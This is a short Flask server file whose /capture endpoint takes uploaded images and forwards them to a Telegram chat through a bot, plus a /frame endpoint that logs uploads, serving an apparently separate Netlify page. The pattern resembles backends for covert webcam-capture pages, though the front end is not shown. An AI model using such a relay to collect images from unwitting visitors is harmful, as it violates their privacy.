from flask import Flask, request
from flask_cors import CORS
import telegram
import threading
import os

app = Flask(__name__)
CORS(app)  # Allow cross-origin requests from Netlify

# Environment variables (set in Railway)
BOT_TOKEN = os.environ["BOT_TOKEN"]
CHAT_ID = os.environ["CHAT_ID"]

bot = telegram.Bot(token=BOT_TOKEN)

def send_photo_async(image_bytes):
    bot.send_photo(chat_id=CHAT_ID, photo=image_bytes)

@app.route("/capture", methods=["POST"])
def capture():
    image = request.files["image"]
    img_bytes = image.read()
    threading.Thread(target=send_photo_async, args=(img_bytes,)).start()
    return "OK", 200
@app.route("/frame", methods=["POST"])
def frame():
    print("FRAME RECEIVED")
    print(request.files)
    return "ok", 200


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
